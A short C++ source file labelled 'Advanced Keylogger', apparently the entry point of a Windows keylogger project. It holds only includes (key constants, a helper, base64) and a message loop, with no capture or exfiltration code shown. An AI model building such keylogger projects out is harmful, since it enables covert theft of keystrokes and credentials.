/*
* Project: Advanced Keylogger
* Author: Joseph Schell
* Date: 08/12/2018
* Sources:
*/
#include <iostream>
#include <Windows.h>
#include "keyConstants.h"
#include "helper.h"
#include "base64.h"
//#include "IO.h"

using namespace std;

int main()
{
	MSG message;

	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	return 0;
}

